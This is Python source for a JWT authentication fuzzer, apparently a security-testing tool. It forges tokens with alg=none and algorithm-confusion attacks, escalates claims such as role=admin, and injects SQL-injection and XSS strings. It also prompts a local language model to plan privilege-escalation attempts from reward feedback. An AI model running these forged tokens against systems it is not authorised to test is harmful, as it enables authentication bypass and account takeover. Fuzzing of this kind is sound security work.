import random
import string
import json
import requests
from typing import Deque, Dict, Any, List, Tuple
from collections import deque

from fuzzer_core.crypto_engine import build_attack_jwt
from fuzzer_core.oracle import OracleResult


class MutatorBase:
    def __init__(self, server_public_key: str):
        self.server_public_key = server_public_key

    def generate_attacks(
        self, base_header: Dict[str, Any], base_payload: Dict[str, Any]
    ) -> List[Tuple[str, str]]:
        raise NotImplementedError()

    def process_feedback(self, description: str, result: OracleResult) -> None:
        pass


class RandomMutator(MutatorBase):
    COMMON_VALUES = [
        "admin",
        "root",
        "superuser",
        "system",
        "administrator",
        0,
        1,
        10,
        99,
        100,
        999,
        -1,
        True,
        False,
        None,
        "1' OR '1'='1",
        "<script>alert(1)</script>",
    ]

    def generate_attacks(
        self, base_header: Dict[str, Any], base_payload: Dict[str, Any]
    ) -> List[Tuple[str, str]]:
        attacks: List[Tuple[str, str]] = []
        for _ in range(5):
            h = base_header.copy()
            p = base_payload.copy()
            target_key = random.choice(list(p.keys()))
            p[target_key] = random.choice(self.COMMON_VALUES)
            crypto_method = random.choice(["invalid", "alg_none", "alg_confusion"])

            if crypto_method == "alg_none":
                h["alg"] = "none"
            elif crypto_method == "alg_confusion":
                h["alg"] = "HS256"

            token = build_attack_jwt(h, p, crypto_method, self.server_public_key)
            attacks.append(
                (token, f"RandomDict: {target_key}={p[target_key]} | {crypto_method}")
            )
        return attacks


class RuleBasedMutator(MutatorBase):
    def generate_attacks(
        self, base_header: Dict[str, Any], base_payload: Dict[str, Any]
    ) -> List[Tuple[str, str]]:
        attacks: List[Tuple[str, str]] = []
        p_admin = base_payload.copy()
        p_admin["role"] = "admin"

        h_none = base_header.copy()
        h_none["alg"] = "none"
        attacks.append(
            (build_attack_jwt(h_none, p_admin, "alg_none"), "Rule-based: alg=none")
        )

        h_conf = base_header.copy()
        h_conf["alg"] = "HS256"
        attacks.append(
            (
                build_attack_jwt(
                    h_conf, p_admin, "alg_confusion", self.server_public_key
                ),
                "Rule-based: Alg Confusion",
            )
        )
        return attacks


class LlmMutator(MutatorBase):
    def __init__(self, server_public_key: str):
        super().__init__(server_public_key)
        self.ollama_url = "http://127.0.0.1:11434/api/generate"
        self.model = "llama3:8b"
        self.history: List[Dict[str, Any]] = []
        self.attack_plan: Deque[Dict[str, Any]] = deque()
        self.best_payloads: List[Dict[str, Any]] = []
        self._last_updates: Dict[str, Any] = {}

    def _calculate_reward(self, result: OracleResult) -> int:
        if result.status == "SUCCESS":
            return 10
        if result.status == "SERVER_ERROR":
            return 6
        if result.http_code == 403:
            return 4
        if result.http_code == 401:
            return 2
        return 1

    def process_feedback(self, description: str, result: OracleResult) -> None:
        reward = self._calculate_reward(result)
        attack_key = description.replace("LLM: ", "")
        self.history.append(
            {"attack": attack_key, "status": result.status, "reward": reward}
        )

        if result.status == "SUCCESS" and "Evolutionary Reuse" not in description:
            try:
                attack_data = json.loads(attack_key)
                self.best_payloads.append(
                    {
                        "updates": attack_data.get("updates"),
                        "crypto_method": attack_data.get("crypto"),
                    }
                )
            except json.JSONDecodeError:
                pass

    def _generate_plan(self, base_header: Dict, base_payload: Dict) -> None:
        print("[LLM] Планирование новой стратегии (анализ истории)...")
        recent_history = self.history[-10:] if self.history else []
        history_str = json.dumps(recent_history, indent=2)

        prompt = f"""You are an advanced AI Fuzzer targeting a JWT authentication system. Your goal is to bypass authorization and get 'SUCCESS' (Reward 10).

# CONTEXT
- Header: {json.dumps(base_header)}
- Payload: {json.dumps(base_payload)}
- Crypto methods: "alg_none", "alg_confusion", "invalid".

# RECENT HISTORY & REWARDS
{history_str}
(Reward 4 = good payload, bad crypto. Reward 2 = good crypto, bad payload.)

# TASK
Generate a batch of 3 diverse, logical hypotheses to test. Focus on privilege escalation.
- Try modifying existing values (`role`, `access_level`).
- Try injecting new logical fields (`is_admin`, `scope`).
- Keep it simple. Avoid SQL injections or complex arrays unless all else fails.

Output ONLY a valid JSON object matching this exact schema:
{{
  "plan":[
    {{
      "rationale": "Brief reasoning based on history",
      "payload_updates": {{"field_name": "new_value"}},
      "crypto_method": "method_name"
    }}
  ]
}}
"""
        try:
            resp = requests.post(
                self.ollama_url,
                json={
                    "model": self.model,
                    "prompt": prompt,
                    "stream": False,
                    "format": "json",
                    "options": {"temperature": 0.5},
                },
                timeout=120,
            )
            raw = resp.json().get("response", "{}")
            plan = json.loads(raw).get("plan", [])
            self.attack_plan.extend(plan)
            print(f"[LLM] Сгенерировано {len(plan)} новых гипотез.")
        except Exception as e:
            print(f"      [!] Ошибка LLM Planner: {e}")

    def generate_attacks(
        self, base_header: Dict[str, Any], base_payload: Dict[str, Any]
    ) -> List[Tuple[str, str]]:
        if self.best_payloads and random.random() < 0.3:
            best = random.choice(self.best_payloads)
            p = base_payload.copy()
            h = base_header.copy()

            updates = dict(best.get("updates") or {}).copy()
            crypto_method = best.get("crypto_method", "invalid")

            if updates:
                key_to_mutate = random.choice(list(updates.keys()))
                val = updates[key_to_mutate]

                if isinstance(val, int):
                    updates[key_to_mutate] = val + random.choice([-1, 1])
                elif isinstance(val, str):
                    updates[key_to_mutate] = val + random.choice(string.ascii_lowercase)

            for k, v in updates.items():
                p[k] = v

            if crypto_method == "alg_none":
                h["alg"] = "none"
            elif crypto_method == "alg_confusion":
                h["alg"] = "HS256"

            token = build_attack_jwt(h, p, crypto_method, self.server_public_key)
            desc = json.dumps({"evolved_from": best.get("updates", {}), "new": updates})
            return [(token, f"Evolutionary Reuse: {desc}")]

        if not self.attack_plan:
            self._generate_plan(base_header, base_payload)
            if not self.attack_plan:
                return []

        attack = self.attack_plan.popleft()
        updates = attack.get("payload_updates", {})
        crypto_method = str(attack.get("crypto_method", "invalid"))
        rationale = attack.get("rationale", "No rationale")

        if crypto_method not in ["alg_none", "alg_confusion", "invalid"]:
            crypto_method = "invalid"

        print(f"      [LLM] Гипотеза: {rationale}")

        h = base_header.copy()
        p = base_payload.copy()
        for k, v in updates.items():
            p[k] = v

        if crypto_method == "alg_none":
            h["alg"] = "none"
        elif crypto_method == "alg_confusion":
            h["alg"] = "HS256"

        token = build_attack_jwt(h, p, crypto_method, self.server_public_key)

        desc = json.dumps({"updates": updates, "crypto": crypto_method})
        self._last_updates = updates  # Сохраняем для `process_feedback`

        return [(token, f"LLM: {desc}")]
